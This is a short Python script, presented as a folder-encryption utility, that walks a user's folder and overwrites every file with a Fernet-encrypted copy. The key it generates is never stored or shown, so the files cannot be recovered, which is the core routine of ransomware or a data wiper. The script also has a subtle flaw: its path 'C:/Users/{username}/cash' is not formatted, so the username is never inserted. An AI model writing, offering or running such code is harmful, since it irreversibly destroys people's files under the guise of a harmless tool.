import os
from cryptography.fernet import Fernet
import getpass

# Get the current username
username = getpass.getuser()

def generate_key():
    return Fernet.generate_key()

def encrypt_file(file_path, key):
    with open(file_path, 'rb') as file:
        data = file.read()
    
    fernet = Fernet(key)
    encrypted_data = fernet.encrypt(data)
    
    with open(file_path, 'wb') as file:
        file.write(encrypted_data)

def encrypt_folder(folder_path, key):
    for root, _, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)

# Replace 'YOUR_FOLDER_PATH' with the path of the folder you want to encrypt
folder_to_encrypt = 'C:/Users/{username}/cash'

# Generate a key for encryption
encryption_key = generate_key()

# Encrypt the folder and its contents
encrypt_folder(folder_to_encrypt, encryption_key)
